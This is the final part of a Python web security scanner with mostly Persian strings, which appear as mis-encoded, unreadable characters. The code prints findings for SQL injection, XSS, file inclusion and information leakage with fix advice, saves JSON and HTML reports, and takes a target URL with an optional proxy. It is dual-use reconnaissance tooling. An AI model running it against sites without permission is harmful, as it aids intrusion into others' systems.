                print(f"\n{key.replace('_', ' ').title()}:")
                for item in value:
                    if isinstance(item, dict):
                        for k, v in item.items():
                            print(f"  {k}: {v}")
                        print()
                    else:
                        print(f"  - {item}")
            else:
                print(f"{key.replace('_', ' ').title()}: {value}")
        
        if self.vulnerabilities:
            print(f"\nâš ï¸  Ù‡Ø´Ø¯Ø§Ø±: {len(self.vulnerabilities)} Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ ÛŒØ§ÙØª Ø´Ø¯:")
            for vuln in self.vulnerabilities:
                print(f"  - {vuln}")
            
            print("\nğŸ”§ ØªÙˆØµÛŒÙ‡â€ŒÙ‡Ø§ÛŒ Ø§Ù…Ù†ÛŒØªÛŒ:")
            if "ØªØ²Ø±ÛŒÙ‚ SQL" in self.vulnerabilities:
                print("  - Ø§Ø² prepared statements Ùˆ ORMÙ‡Ø§ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯")
                print("  - ÙˆØ±ÙˆØ¯ÛŒ Ú©Ø§Ø±Ø¨Ø± Ø±Ø§ Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ Ùˆ ÙÛŒÙ„ØªØ± Ú©Ù†ÛŒØ¯")
                print("  - Ø­Ø¯Ø§Ù‚Ù„ Ø§Ù…ØªÛŒØ§Ø² (Principle of Least Privilege) Ø±Ø§ Ø¨Ø±Ø§ÛŒ Ø§ØªØµØ§Ù„Ø§Øª Ø¯ÛŒØªØ§Ø¨ÛŒØ³ Ø§Ø¹Ù…Ø§Ù„ Ú©Ù†ÛŒØ¯")
            
            if "XSS" in self.vulnerabilities:
                print("  - Ø§Ø² encoding Ù…Ù†Ø§Ø³Ø¨ Ø¨Ø±Ø§ÛŒ Ø®Ø±ÙˆØ¬ÛŒ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯")
                print("  - Content Security Policy (CSP) Ù¾ÛŒØ§Ø¯Ù‡â€ŒØ³Ø§Ø²ÛŒ Ú©Ù†ÛŒØ¯")
                print("  - cookieÙ‡Ø§ Ø±Ø§ Ø¨Ø§ flag HttpOnly Ùˆ Secure Ø¹Ù„Ø§Ù…Øª Ú¯Ø°Ø§Ø±ÛŒ Ú©Ù†ÛŒØ¯")
            
            if "File Inclusion" in self.vulnerabilities or "Directory Traversal" in self.vulnerabilities:
                print("  - Ø§Ø² whitelist Ø¨Ø±Ø§ÛŒ ÙØ§ÛŒÙ„â€ŒÙ‡Ø§ÛŒ Ù…Ø¬Ø§Ø² Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯")
                print("  - Ù…Ø³ÛŒØ±Ù‡Ø§ÛŒ ÙØ§ÛŒÙ„ Ø±Ø§ Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ Ú©Ù†ÛŒØ¯")
                print("  - Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ ÙØ§ÛŒÙ„â€ŒÙ‡Ø§ÛŒ Ø­Ø³Ø§Ø³ Ø±Ø§ Ù…Ø­Ø¯ÙˆØ¯ Ú©Ù†ÛŒØ¯")
            
            if "Ù†Ø´Øª Ø§Ø·Ù„Ø§Ø¹Ø§Øª" in self.vulnerabilities:
                print("  - Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø­Ø³Ø§Ø³ Ø±Ø§ Ø§Ø² Ú©Ø¯ Ù…Ù†Ø¨Ø¹ Ø­Ø°Ù Ú©Ù†ÛŒØ¯")
                print("  - Ù‡Ø¯Ø±Ù‡Ø§ÛŒ Ø§Ø·Ù„Ø§Ø¹Ø§ØªÛŒ ØºÛŒØ±Ø¶Ø±ÙˆØ±ÛŒ Ø±Ø§ Ø­Ø°Ù Ú©Ù†ÛŒØ¯")
                print("  - Ø§Ø² ÙØ§ÛŒÙ„â€ŒÙ‡Ø§ÛŒ Ù…Ø­ÛŒØ·ÛŒ (env) Ø¨Ø±Ø§ÛŒ Ø°Ø®ÛŒØ±Ù‡ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø­Ø³Ø§Ø³ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯")
            
            print("\nØªÙˆØµÛŒÙ‡ Ù…ÛŒâ€ŒØ´ÙˆØ¯ Ø§ÛŒÙ† Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒâ€ŒÙ‡Ø§ Ù‡Ø±Ú†Ù‡ Ø³Ø±ÛŒØ¹ØªØ± Ø¨Ø±Ø·Ø±Ù Ø´ÙˆÙ†Ø¯.")
        else:
            print("\nâœ… Ù‡ÛŒÚ† Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ Ø¬Ø¯ÛŒ ÛŒØ§ÙØª Ù†Ø´Ø¯. Ø³Ø§ÛŒØª Ø´Ù…Ø§ Ø§Ø² Ø§Ù…Ù†ÛŒØª Ù†Ø³Ø¨ØªØ§Ù‹ Ø®ÙˆØ¨ÛŒ Ø¨Ø±Ø®ÙˆØ±Ø¯Ø§Ø± Ø§Ø³Øª.")
        
        self.save_report_to_file(url)
        self.save_report_to_html(url)
        
        return self.scan_results
    
    def save_report_to_file(self, url):
        """Ø°Ø®ÛŒØ±Ù‡ Ú¯Ø²Ø§Ø±Ø´ Ø¯Ø± ÙØ§ÛŒÙ„ JSON"""
        parsed_url = urlparse(url)
        domain = parsed_url.hostname
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"security_scan_{domain}_{timestamp}.json"
        
        report_data = {
            'target': url,
            'scan_date': time.strftime('%Y-%m-%d %H:%M:%S'),
            'vulnerabilities': self.vulnerabilities,
            'results': self.scan_results,
            'performance': self.performance_metrics
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)
        
        print(f"\nğŸ“„ Ú¯Ø²Ø§Ø±Ø´ Ú©Ø§Ù…Ù„ Ø¯Ø± ÙØ§ÛŒÙ„ {filename} Ø°Ø®ÛŒØ±Ù‡ Ø´Ø¯.")
    
    def save_report_to_html(self, url):
        """Ø°Ø®ÛŒØ±Ù‡ Ú¯Ø²Ø§Ø±Ø´ Ø¯Ø± ÙØ§ÛŒÙ„ HTML"""
        parsed_url = urlparse(url)
        domain = parsed_url.hostname
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"security_scan_{domain}_{timestamp}.html"
        
        html_template = f"""
        <!DOCTYPE html>
        <html lang="fa">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Ú¯Ø²Ø§Ø±Ø´ Ø§Ø³Ú©Ù† Ø§Ù…Ù†ÛŒØªÛŒ - {domain}</title>
            <style>
                body {{ font-family: Tahoma, Arial, sans-serif; direction: rtl; margin: 20px; background-color: #f5f5f5; }}
                .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
                .header {{ text-align: center; padding: 20px; background: #2c3e50; color: white; border-radius: 10px; margin-bottom: 20px; }}
                .section {{ margin-bottom: 30px; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }}
                .vulnerable {{ background-color: #ffe6e6; border-color: #ff9999; }}
                .secure {{ background-color: #e6ffe6; border-color: #99ff99; }}
                .warning {{ background-color: #fff9e6; border-color: #ffcc99; }}
                .vuln-list {{ color: #cc0000; font-weight: bold; }}
                .recommendation {{ background-color: #e6f2ff; padding: 15px; border-radius: 5px; margin-top: 10px; }}
                table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
                th, td {{ padding: 8px; text-align: right; border: 1px solid #ddd; }}
                th {{ background-color: #f2f2f2; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>ğŸ›¡ï¸ Ú¯Ø²Ø§Ø±Ø´ Ø§Ø³Ú©Ù† Ø§Ù…Ù†ÛŒØªÛŒ Ù¾ÛŒØ´Ø±ÙØªÙ‡</h1>
                    <p>Ù‡Ø¯Ù: {url}</p>
                    <p>ØªØ§Ø±ÛŒØ®: {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
                </div>
        """
        
        # Ø§ÙØ²ÙˆØ¯Ù† Ø¨Ø®Ø´ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒâ€ŒÙ‡Ø§
        if self.vulnerabilities:
            html_template += f"""
                <div class="section vulnerable">
                    <h2>âš ï¸ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒâ€ŒÙ‡Ø§ÛŒ ÛŒØ§ÙØª Ø´Ø¯Ù‡ ({len(self.vulnerabilities)})</h2>
                    <ul class="vuln-list">
            """
            for vuln in self.vulnerabilities:
                html_template += f"<li>{vuln}</li>"
            html_template += """
                    </ul>
                </div>
            """
        else:
            html_template += """
                <div class="section secure">
                    <h2>âœ… Ù‡ÛŒÚ† Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ Ø¬Ø¯ÛŒ ÛŒØ§ÙØª Ù†Ø´Ø¯</h2>
                    <p>Ø³Ø§ÛŒØª Ø§Ø² Ø§Ù…Ù†ÛŒØª Ù†Ø³Ø¨ØªØ§Ù‹ Ø®ÙˆØ¨ÛŒ Ø¨Ø±Ø®ÙˆØ±Ø¯Ø§Ø± Ø§Ø³Øª.</p>
                </div>
            """
        
        # Ø§ÙØ²ÙˆØ¯Ù† Ù†ØªØ§ÛŒØ¬ Ø¬Ø²Ø¦ÛŒØ§Øª
        for key, value in self.scan_results.items():
            section_class = "warning" if "Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±" in str(value) or "Ù‡Ø´Ø¯Ø§Ø±" in str(value) else "secure"
            
            html_template += f"""
                <div class="section {section_class}">
                    <h3>{key.replace('_', ' ').title()}</h3>
                    <pre>{json.dumps(value, ensure_ascii=False, indent=2) if isinstance(value, (dict, list)) else str(value)}</pre>
                </div>
            """
        
        # Ø§ÙØ²ÙˆØ¯Ù† ØªÙˆØµÛŒÙ‡â€ŒÙ‡Ø§ÛŒ Ø§Ù…Ù†ÛŒØªÛŒ
        if self.vulnerabilities:
            html_template += """
                <div class="recommendation">
                    <h3>ğŸ”§ ØªÙˆØµÛŒÙ‡â€ŒÙ‡Ø§ÛŒ Ø§Ù…Ù†ÛŒØªÛŒ</h3>
                    <ul>
            """
            
            if "ØªØ²Ø±ÛŒÙ‚ SQL" in self.vulnerabilities:
                html_template += """
                        <li>Ø§Ø² prepared statements Ùˆ ORMÙ‡Ø§ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯</li>
                        <li>ÙˆØ±ÙˆØ¯ÛŒ Ú©Ø§Ø±Ø¨Ø± Ø±Ø§ Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ Ùˆ ÙÛŒÙ„ØªØ± Ú©Ù†ÛŒØ¯</li>
                        <li>Ø­Ø¯Ø§Ù‚Ù„ Ø§Ù…ØªÛŒØ§Ø² (Principle of Least Privilege) Ø±Ø§ Ø¨Ø±Ø§ÛŒ Ø§ØªØµØ§Ù„Ø§Øª Ø¯ÛŒØªØ§Ø¨ÛŒØ³ Ø§Ø¹Ù…Ø§Ù„ Ú©Ù†ÛŒØ¯</li>
                """
            
            if "XSS" in self.vulnerabilities:
                html_template += """
                        <li>Ø§Ø² encoding Ù…Ù†Ø§Ø³Ø¨ Ø¨Ø±Ø§ÛŒ Ø®Ø±ÙˆØ¬ÛŒ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯</li>
                        <li>Content Security Policy (CSP) Ù¾ÛŒØ§Ø¯Ù‡â€ŒØ³Ø§Ø²ÛŒ Ú©Ù†ÛŒØ¯</li>
                        <li>cookieÙ‡Ø§ Ø±Ø§ Ø¨Ø§ flag HttpOnly Ùˆ Secure Ø¹Ù„Ø§Ù…Øª Ú¯Ø°Ø§Ø±ÛŒ Ú©Ù†ÛŒØ¯</li>
                """
            
            html_template += """
                    </ul>
                    <p>ØªÙˆØµÛŒÙ‡ Ù…ÛŒâ€ŒØ´ÙˆØ¯ Ø§ÛŒÙ† Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒâ€ŒÙ‡Ø§ Ù‡Ø±Ú†Ù‡ Ø³Ø±ÛŒØ¹ØªØ± Ø¨Ø±Ø·Ø±Ù Ø´ÙˆÙ†Ø¯.</p>
                </div>
            """
        
        html_template += """
            </div>
        </body>
        </html>
        """
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_template)
        
        print(f"ğŸ“Š Ú¯Ø²Ø§Ø±Ø´ HTML Ø¯Ø± ÙØ§ÛŒÙ„ {filename} Ø°Ø®ÛŒØ±Ù‡ Ø´Ø¯.")

def main():
    """ØªØ§Ø¨Ø¹ Ø§ØµÙ„ÛŒ Ø¨Ø±Ø§ÛŒ Ø§Ø¬Ø±Ø§ÛŒ Ø§Ø³Ú©Ù†Ø±"""
    print("ğŸ›¡ï¸ Ø³ÙˆÙ¾Ø± Ø§Ø³Ú©Ù†Ø± Ø§Ù…Ù†ÛŒØªÛŒ Ù¾ÛŒØ´Ø±ÙØªÙ‡ - Ù†Ø³Ø®Ù‡ Ø­Ø±ÙÙ‡â€ŒØ§ÛŒ")
    print("ØªÙˆØ³Ø¹Ù‡ Ø¯Ø§Ø¯Ù‡ Ø´Ø¯Ù‡ ØªÙˆØ³Ø· Ù…Ø¹Ù„Ù… Ùˆ Ø´Ø§Ú¯Ø±Ø¯")
    print("="*50)
    
    # Ø¨Ø±Ø±Ø³ÛŒ Ø¢Ø±Ú¯ÙˆÙ…Ø§Ù†â€ŒÙ‡Ø§ÛŒ Ø®Ø· ÙØ±Ù…Ø§Ù†
    if len(sys.argv) > 1:
        website_url = sys.argv[1]
    else:
        website_url = input("Ù„Ø·ÙØ§Ù‹ Ø¢Ø¯Ø±Ø³ Ø³Ø§ÛŒØª Ø±Ø§ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ (Ù…Ø«Ø§Ù„: example.com): ").strip()
    
    if not website_url:
        print("âŒ Ø¢Ø¯Ø±Ø³ Ø³Ø§ÛŒØª Ù†Ù…ÛŒâ€ŒØªÙˆØ§Ù†Ø¯ Ø®Ø§Ù„ÛŒ Ø¨Ø§Ø´Ø¯.")
        return
    
    # Ø§ÛŒØ¬Ø§Ø¯ Ø§Ø³Ú©Ù†Ø±
    scanner = AdvancedSecurityScanner(max_threads=5, delay_range=(1, 3), timeout=15)
    
    # Ø¨Ø±Ø±Ø³ÛŒ ÙˆØ¬ÙˆØ¯ ÙØ§ÛŒÙ„ Ù¾ÛŒÚ©Ø±Ø¨Ù†Ø¯ÛŒ
    config_file = 'scanner_config.yaml'
    if os.path.exists(config_file):
        use_config = input("ğŸ“ ÙØ§ÛŒÙ„ Ù¾ÛŒÚ©Ø±Ø¨Ù†Ø¯ÛŒ ÛŒØ§ÙØª Ø´Ø¯. Ø¢ÛŒØ§ Ù…ÛŒâ€ŒØ®ÙˆØ§Ù‡ÛŒØ¯ Ø§Ø² Ø¢Ù† Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯ØŸ (y/n): ").strip().lower()
        if use_config == 'y':
            scanner.load_config(config_file)
    
    # Ø¨Ø±Ø±Ø³ÛŒ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² Ù¾Ø±ÙˆÚ©Ø³ÛŒ
    use_proxy = input("ğŸŒ Ø¢ÛŒØ§ Ù…ÛŒâ€ŒØ®ÙˆØ§Ù‡ÛŒØ¯ Ø§Ø² Ù¾Ø±ÙˆÚ©Ø³ÛŒ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯ØŸ (y/n): ").strip().lower()
    if use_proxy == 'y':
        proxy_url = input("Ù„Ø·ÙØ§Ù‹ Ø¢Ø¯Ø±Ø³ Ù¾Ø±ÙˆÚ©Ø³ÛŒ Ø±Ø§ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ (Ù…Ø«Ø§Ù„: http://proxy.example.com:8080): ").strip()
        if proxy_url:
            scanner.set_proxy(proxy_url)
    
    # Ø§Ø¬Ø±Ø§ÛŒ Ø§Ø³Ú©Ù†
    scanner.scan_website(website_url)

if __name__ == "__main__":
    main()